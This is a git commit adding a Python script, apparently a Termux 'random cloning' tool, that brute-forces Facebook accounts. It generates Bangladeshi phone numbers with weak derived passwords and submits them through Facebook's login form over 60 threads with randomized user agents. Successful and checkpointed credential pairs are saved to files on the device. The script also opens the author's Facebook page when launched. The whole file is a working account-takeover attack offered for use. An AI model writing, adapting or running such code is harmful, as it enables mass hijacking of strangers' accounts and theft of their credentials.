4e50cc7948fc325b37aed8e6dda94f81e59db70b
askatxriddu <140191290+askatxriddu@users.noreply.github.com>
2023-08-07 07:42:53 +0600

    Add files via upload

---
+++ test.py
@@ -0,0 +1,165 @@
+import os,time,sys
+os.system('clear')
+from os import path
+import os,base64,zlib,pip,urllib
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system(f'pip install requests futures==2 > /dev/null')
+except:pass
+os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
+
+logo = """ \033[1;92
+\033[1;32m   ┏┓┏┓┓┏┓┏┓┏┳┓  ┏━┏┓\033[1;32m   
+\033[1;32m   ┣┫┗┓┃┫ ┣┫ ┃ ━━┗┓┃┫\033[1;32m   
+\033[1;32m   ┛┗┗┛┛┗┛┛┗ ┻   ┗┛┗┛\033[1;32m   
+\033[1;32m    ╔═════════════════  𝘼𝘿𝙈𝙄𝙉 𝙄𝙉𝙁𝙊  ══════════════╗
+\033[1;32m    ║     [🍁] CREATED BY   :  ASKAT MRIDHA                                                                                 ║
+\033[1;32m    ║     [🍁] FACEBOK      :  ASKATMRIDHA                                                                                     ║
+\033[1;32m    ║     [🍁] GITHUB       :  askatxriddu                                                                                              ║
+\033[1;32m    ║     [🍁] TOOL STATUS  :  𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈                                                                                 ║
+\033[1;32m    ║     [🍁] TEAM         :  A-M TERMUX ZONE                                                                                 ║
+\033[1;32m    ║     [🍁] TOOL VIRSION :  \033[1;91m01.6         \033[1;32m                                                 ║
+\033[1;32m    ║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱║
+\033[1;32m    ║     [🍁] PLZ SAPPORT ME BRO....                                                                                              ║
+\033[1;32m    ║     [🍁] ASKAT TERMUX COMMEND ZONE....                                                                         ║
+\033[1;32m    ╚═════════════════  ASKAT-MRIDHA  ═════════════╝
+
+\033[1;32m[\033[0;41;37m==========={ ASKAT MRIDHA TOOL'S 🔥\033[0;37;41m FREE }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
+"""
+ok = []
+cp = []
+id = []
+session = requests.Session()
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for ua in range(1000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['12' , '13' , '14' , '15'])
+      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,100)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(ug)
+      
+      
+      
+      ugen2=['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36;]'
+
+'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36;]'
+
+'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36;]'
+
+'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36;]'
+
+'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36;]'
+
+'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36;]'
+
+'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;]'
+
+
+def Main():
+	os.system('clear')
+	print(logo)
+	print("[🍁] BD SIM CODE : [017 018 019 013 015 016] ")
+	love = input('<> SELECT : ')
+	print('[🍁] EXAMPLE : [1000,5000,10000,15000,20000] ')
+	limit = int(input('<> LIMIT : '))
+	for nmbr in range(limit):
+		lova = ''.join(random.choice(string.digits) for _ in range(2))
+		lovb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with tred(max_workers=60) as turag:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[🍁] CHOICE CODE : '+love)
+		print('[🍁] TOTAL ID   :  '+tl)
+		print('[🍁] CRACK STARTED....... ')
+		print(50*'━')
+		for guru in user:
+			uid = love+lova+lovb+guru
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
+			turag.submit(test,uid,pwx,tl)
+	print(50*'━')
+	print(' [🍁] CRACK DONE......... ')
+	print(50*'━')
+	os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
+	exit()
+def test(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r\033[1;90m[\033[1;92mASKAT-50\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'cache-control': 'max-age=0',
+           'sec-ch-prefers-color-scheme': 'light',
+           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+           'sec-ch-ua-mobile': '?0',
+           'sec-ch-ua-platform': '"Linux"',
+           'sec-ch-ua-platform-version': '""',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36',
+}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m[ASKAT-OK] '+cid+' ¤ '+ps+'\33[0;92m')
+                oks.append(cid)
+                open('/sdcard/ASKAT-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f"\r\33[1;92m[ASKAT-CP] {uid} ¤ {ps}")
+                open('/sdcard/ASKAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+        pass
+Main()
